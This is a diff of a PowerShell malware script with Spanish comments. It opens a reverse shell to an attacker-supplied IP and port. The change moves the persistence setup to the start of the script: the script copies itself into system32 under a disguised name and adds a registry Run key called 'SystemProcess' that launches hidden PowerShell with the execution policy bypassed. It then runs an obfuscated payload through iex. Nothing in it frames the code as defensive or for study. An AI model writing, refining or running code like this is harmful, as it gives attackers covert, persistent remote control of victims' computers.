@@ -1,6 +1,15 @@
 param([string]$ip, [int]$port, [int]$offset=4)
 $ErrorActionPreference = "SilentlyContinue"
 
+# CONFIGURAR PERSISTENCIA PRIMERO
+# Copiar el script a system32 o cualquier otra carpeta oculta
+$destPath = "$env:windir\system32\hidden_script.ps1"
+Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $destPath -Force
+
+# Añadir clave de persistencia en el registro
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "SystemProcess" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $destPath"
+
 # Reverse shell
 $rev_shell = @'
 $x=(New-Object net.sockets.tcpclient("$ip",$port)).getstream();
@@ -47,18 +56,8 @@ $strings = $strings | %{AplicarOffset($_)}
 # Construir el comando final ofuscado
 $final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|iex'
 
-# COPIA DEL SCRIPT A SYSTEM32 O OTRA CARPETA OCULTA
-$destPath = "$env:windir\system32\hidden_script.ps1"
-Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $destPath -Force
-
-# CONFIGURACIÓN DE PERSISTENCIA EN EL REGISTRO
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "SystemProcess" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $destPath"
-
-# EJECUTAR EL SCRIPT DE FORMA OCULTA
-Start-Process -WindowStyle Hidden -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$destPath`""
-
-Write-Output "Persistencia configurada y script ejecutándose en segundo plano."
+# Ejecutar el código ofuscado
+iex $final
 
 
 
